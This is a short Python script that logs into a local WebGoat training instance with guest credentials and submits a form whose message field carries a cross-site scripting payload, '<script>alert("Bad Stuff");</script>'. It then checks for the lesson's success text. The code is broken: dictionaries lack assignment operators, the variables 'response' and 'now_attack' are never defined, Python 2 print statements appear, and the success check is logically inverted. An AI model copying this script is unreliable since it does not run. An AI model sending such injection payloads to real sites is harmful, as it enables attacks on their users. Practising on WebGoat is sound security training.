import argparse
import re
import json
import sys
import requests

login_credentials{
	'username': 'guest',
	'password': 'guest'
}

attack_fields{
	'gId': 'Gmail id',
	'gPass': 'password',
	'subject' : 'Comment for Webgoat',
	'to': 'bill.gates@microsoft.com',
	'msg': '<script>alert("Bad Stuff");</script>'
	
}

current_session = requests.session();

home= current_session.get("http://127.0.0.1:8080/WebGoat/login.mvc")
login= current_session.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check',login_credentials)


our_site_link = json.loads(response.text)[16].get('children')[2].get('link')

attack_page= current_session.get("http://127.0.0.1:8080/WebGoat/"+our_site_link)

attack_page= current_session.post("http://127.0.0.1:8080/WebGoat/"+our_site_link, attack_fields)

if now_attack.text.find('Congratulations. You have successfully completed this lesson'):
  print "Vulnerability Found"
else:
  print "Passed"

